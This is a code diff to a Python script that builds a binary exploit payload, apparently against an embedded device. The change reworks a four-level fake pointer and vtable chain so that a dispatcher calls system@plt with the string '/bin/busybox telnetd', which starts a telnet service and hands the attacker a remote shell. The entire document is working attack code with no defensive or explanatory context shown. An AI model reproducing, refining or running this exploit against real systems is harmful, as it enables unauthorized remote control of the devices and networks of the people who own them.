@@ -21,10 +21,14 @@ CMD = b"/bin/busybox telnetd\x00"
 
 def build(S: int, k_f: int = 0, k_a: int = 100, k_b: int = 200) -> bytes:
     buf = bytearray(24000)
-    # command string at node offset K_B
-    buf[k_b : k_b + len(CMD)] = CMD
-    # [B+28] = system@plt → node offset K_B+28
-    buf[k_b + 28 : k_b + 32] = struct.pack(">I", S2_SYSTEM_PLT)
+    # 4-level chain: [F+6404]=A; [A+8]=B; [B]=V (vtable); FN=[V+28]; r3 at call = V.
+    # The command string lives AT V (r3 = V = the string for system()).
+    k_v = k_b + 400                     # vtable V well clear of B
+    buf[k_v : k_v + len(CMD)] = CMD     # system(V) → /bin/sh -c "<CMD>"
+    # [V+28] = system@plt (FN). V+0..27 = cmd bytes; NUL-terminated before +28.
+    buf[k_v + 28 : k_v + 32] = struct.pack(">I", S2_SYSTEM_PLT)
+    # [B] = V  (the vtable pointer the dispatcher derefs)
+    buf[k_b : k_b + 4] = struct.pack(">I", S + 6380 + k_v)
     # observer cell at node offset 23620: fake_ptr = F = S+6380+k_f
     F = S + 6380 + k_f
     buf[NODE_OFF_OBSERVER : NODE_OFF_OBSERVER + 4] = struct.pack(">I", F)
@@ -39,7 +43,7 @@ def build(S: int, k_f: int = 0, k_a: int = 100, k_b: int = 200) -> bytes:
     # [A+8]: A = S+6380+k_a → A+8 = S+6380+(k_a+8) → node offset k_a+8 holds B
     B = S + 6380 + k_b
     buf[k_a + 8 : k_a + 12] = struct.pack(">I", B)
-    # [B+28] already placed above (k_b+28).
+    # (FN now lives at [V+28]; [B] points at V.)
 
     out = bytearray(bytes([0x57, 0x90, 0x75, 0x36]))
     out += struct.pack(">BII", 1, 5, 5)
